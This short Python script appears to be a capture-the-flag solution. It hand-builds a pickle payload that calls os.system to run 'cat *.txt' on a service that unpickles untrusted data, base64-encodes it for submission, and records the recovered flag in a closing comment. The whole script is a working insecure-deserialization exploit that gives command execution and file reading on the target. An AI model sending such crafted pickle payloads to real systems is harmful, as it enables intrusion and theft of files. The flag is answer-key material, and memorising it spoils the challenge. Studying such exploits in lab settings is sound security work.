import base64

payload = b'''\
(S'cat *.txt'
ios
system
.'''

payload = base64.b64encode(payload)
print(payload)  # b'KFMnY2F0ICoudHh0Jwppb3MKc3lzdGVtCi4='

# ptm{Th3_s3cr3t_1ngr3di3nt_w3re_th3_fri3nds_w3_m4de_4l0ng_th3_w4y}
